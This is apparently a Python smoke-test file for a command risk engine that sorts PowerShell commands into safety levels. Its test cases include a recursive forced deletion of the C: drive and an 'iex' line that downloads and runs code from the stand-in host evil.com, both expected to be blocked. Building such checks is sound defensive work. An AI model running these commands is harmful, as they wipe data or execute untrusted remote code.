"""Quick smoke tests for the risk engine — no API needed."""

from src.risk_engine import analyze_risk

tests = [
    ("Remove-Item -Recurse -Force C:\\", "BLOCKED"),
    ("Get-ChildItem", "SAFE"),
    ("iex (New-Object Net.WebClient).DownloadString('http://evil.com')", "BLOCKED"),
    ("mkdir pruebas", "SAFE"),
    ("Stop-Process -Name chrome", None),  # CAUTION or DANGEROUS, either is fine
]

all_pass = True
for cmd, expected in tests:
    r = analyze_risk(cmd)
    if expected is None:
        ok = r.level in ("CAUTION", "DANGEROUS")
    else:
        ok = r.level == expected

    status = "PASS ✅" if ok else "FAIL ❌"
    print(f"{status}  [{r.level:10}] score={r.score:3}  cmd={cmd[:55]}")
    if not ok:
        all_pass = False
        print(f"       Expected: {expected}, Got: {r.level}")
        print(f"       Reasons: {r.reasons}")

print()
print("=== TODOS LOS TESTS PASARON ===" if all_pass else "=== ALGUNOS TESTS FALLARON ===")
